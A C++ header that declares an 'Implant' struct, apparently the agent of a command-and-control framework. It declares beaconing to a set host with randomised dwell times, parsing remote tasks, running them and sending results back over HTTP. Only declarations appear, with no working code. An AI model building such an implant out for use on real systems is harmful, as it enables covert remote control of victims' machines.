#pragma once

#include "tasks.h"


struct Implant {
  Implant(std::string host, std::string port, std::string uri);
  std::future<void> taskThread;

  void beacon();
  void setMeanDwell();
  void setRunning();
  void serviceTasks();
private:
  const std::string host, port, uri;
  std::exponential_distribution<double> dwellDistributionSeconds;
  std::atomic_bool isRunning;
  std::mutex taskMutex, resultsMutex;
  boost::property_tree::ptree results;
  std::vector<Task> tasks;
  std::random_device device;
  void parseTasks(const std::string& response);
  [[nodiscard]] std::string sendResults();
};

[[nodiscard]] std::string sendHttpRequest(std::string_view host, 
    std::string_view port, std::string_view uri, std::string_view payload);

